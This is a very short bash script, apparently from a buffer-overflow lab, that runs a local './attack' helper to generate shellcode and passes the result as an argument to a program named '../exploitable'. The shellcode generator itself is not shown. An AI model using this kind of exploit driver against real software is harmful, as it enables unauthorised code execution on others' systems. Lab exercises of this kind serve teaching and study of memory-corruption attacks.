#!/bin/bash

# generate shell code

BUF=`./attack 545`

# exploit ...
../exploitable $BUF
